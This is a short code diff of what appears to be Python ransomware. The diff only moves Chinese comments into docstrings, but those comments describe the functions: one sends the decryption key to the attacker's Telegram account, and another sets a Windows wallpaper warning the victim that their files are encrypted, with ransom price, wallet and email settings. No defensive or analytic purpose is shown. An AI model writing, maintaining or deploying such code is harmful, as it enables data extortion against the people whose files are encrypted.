@@ -35,8 +35,10 @@ g_email = 'test@test.com'
 
 
 
-"""向 telegram 账号发送解密密钥"""
 def SendKey(key_val):
+	"""
+	向 telegram 账号发送解密密钥
+	"""
 	global g_bot_token, g_chat_id
 
 	try:
@@ -48,8 +50,10 @@ def SendKey(key_val):
 	except: pass
 
 
-'''设置 Windows 的桌面壁纸，用于提醒对方，他的资料已经被加密了'''
 def SetWallpaper():
+	"""
+	设置 Windows 的桌面壁纸，用于提醒对方，他的资料已经被加密了
+	"""
 	global g_price, g_wallet, g_email
 
 	# 设置图片信息（像素大小和背景色）
